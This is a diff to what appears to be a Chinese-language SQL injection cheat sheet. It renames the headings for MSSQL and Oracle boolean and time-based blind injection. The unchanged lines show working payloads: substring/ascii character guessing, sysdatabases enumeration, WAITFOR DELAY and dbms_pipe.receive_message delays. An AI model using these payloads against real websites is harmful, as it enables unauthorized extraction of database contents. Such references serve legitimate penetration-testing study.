@@ -186,7 +186,7 @@ mysql盲注
 mssql盲注
 --------------------------------------
 
-布尔盲注
+mssql布尔盲注
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - 测试数据库名个数
 	+ ``id=1 and 1=(select count(*) from master.dbo.sysdatabases where dbid=5)``
@@ -213,7 +213,7 @@ mssql盲注
 - 猜解数据
 	+ 猜解opusername列第一个字符：``id=1 and ascii(substring((select top 1 opusername from Portal_Announcementscat),1,1)) = 97``
 	
-时间盲注
+mssql时间盲注
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - 判断是否存在时间盲注
 	+ ``id=1 WAITFOR DELAY '0:0:5'--``
@@ -247,7 +247,7 @@ OBB带外注入
 Oracle盲注
 --------------------------------------
 
-布尔盲注
+Oracle布尔盲注
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - 猜用户名(substr)
 	+ ``id=1' and (select substr(user,1,1) from dual)='S' --``
@@ -266,7 +266,7 @@ Oracle盲注
 - 猜解用户名(instr)
 	+ ``id=1'and 1=(instr((select user from dual),'SCOTT')) --``
 	
-时间盲注
+Oracle时间盲注
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - 猜解用户名
 	+ ``id=1' and (select decode(substr(user,1,1),'S',dbms_pipe.receive_message('cc',5),0) from dual) is not null--``
